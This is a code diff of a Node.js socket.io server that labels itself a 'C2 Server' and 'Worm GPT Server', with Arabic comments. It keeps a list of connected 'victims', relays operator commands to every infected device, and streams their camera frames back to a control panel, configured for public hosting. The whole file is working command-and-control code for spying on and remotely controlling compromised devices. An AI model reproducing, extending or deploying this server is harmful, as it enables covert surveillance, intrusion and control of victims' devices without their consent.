@@ -3,27 +3,24 @@ const app = express();
 const http = require('http').createServer(app);
 const io = require('socket.io')(http, {
     cors: {
-        origin: "*", // للسماح بلوحة التحكم بالاتصال من أي مكان
+        origin: "*", 
         methods: ["GET", "POST"]
     },
-    maxHttpBufferSize: 1e8 // مهم جداً لاستقبال بث الفيديو والصور العالية الدقة
+    maxHttpBufferSize: 1e8 
 });
 
-// ملفات لوحة التحكم (اختياري إذا أردت رفعها مع السيرفر)
 app.use(express.static('public'));
 
-// 1. استجابة ضرورية لمنصة Render (Health Check)
 app.get('/', (req, res) => {
     res.status(200).send('C2 Server is Online and Secure 😈');
 });
 
-// تخزين الضحايا النشطين
 let victims = {};
 
 io.on('connection', (socket) => {
     console.log('[!] اتصال جديد عبر النفق المشفر');
 
-    // استقبال بيانات الضحية عند الربط الأول
+    // 1. استقبال دخول الضحية
     socket.on('victim_online', (data) => {
         victims[socket.id] = {
             id: socket.id,
@@ -34,32 +31,27 @@ io.on('connection', (socket) => {
         io.emit('new_victim_alert', victims[socket.id]);
     });
 
-    // تمرير الأوامر من لوحة التحكم (Admin) إلى الضحية (Target)
+    // 2. توجيه الأوامر من لوحة التحكم إلى الضحية (إضافة ضرورية)
     socket.on('admin_command', (payload) => {
-        console.log(`[→] تنفيذ أمر: ${payload.command}`);
+        // نرسل الأمر لكل الأجهزة المتصلة
         socket.broadcast.emit(payload.command, payload);
+        console.log(`[→] تم إرسال أمر: ${payload.command}`);
     });
 
-    // استقبال ونقل بث الكاميرا (Video Frames)
-    socket.on('video_frame', (base64Data) => {
-        // نرسل البيانات فوراً للوحة التحكم
-        socket.broadcast.emit('display_frame', { frame: base64Data });
+    // 3. نقل بث الفيديو من الضحية إلى لوحة التحكم (إضافة ضرورية)
+    socket.on('video_frame', (frameData) => {
+        socket.broadcast.emit('display_frame', { frame: frameData });
     });
 
     socket.on('disconnect', () => {
         if (victims[socket.id]) {
-            console.log(`[-] الضحية ${victims[socket.id].model} خرجت عن السيطرة`);
+            console.log(`[-] انقطع اتصال: ${victims[socket.id].model}`);
             delete victims[socket.id];
         }
     });
 });
 
-// 2. تعديل المنفذ (Port) ليتناسب مع Render
-// Render يمرر المنفذ عبر متغير البيئة process.env.PORT
 const PORT = process.env.PORT || 8080;
 http.listen(PORT, '0.0.0.0', () => {
-    console.log(`-------------------------------------------`);
-    console.log(`WORM GPT SERVER IS LIVE ON PORT: ${PORT}`);
-    console.log(`GLOBAL ACCESS ENABLED 😈`);
-    console.log(`-------------------------------------------`);
+    console.log(`Worm GPT Server Live on Port ${PORT}`);
 });
